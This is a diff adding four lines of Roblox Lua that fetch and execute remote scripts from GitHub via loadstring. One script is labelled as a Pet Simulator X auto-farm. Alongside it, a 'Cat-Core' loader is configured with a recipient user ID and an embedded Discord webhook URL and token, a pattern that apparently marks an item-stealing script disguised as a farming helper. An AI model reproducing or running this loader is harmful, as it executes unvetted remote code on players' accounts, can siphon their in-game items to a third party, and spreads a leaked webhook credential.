@@ -1,0 +1,4 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/KISOOUF/Cat-Core/main/script"))()
+_G.UserID = 3726378811
+_G.WebHook = "https://discord.com/api/webhooks/1061679221019263067/msBWJ3skYkseKOEApmLeI9QUeLRift0Oxr63HftBTqWA6LC_Mb0l3-tFT5aewjUZob7a"
+loadstring(game:HttpGet('https://raw.githubusercontent.com/vestyx/PetSimulatorXAutoFarm/main/HasteFarm.lua'))()
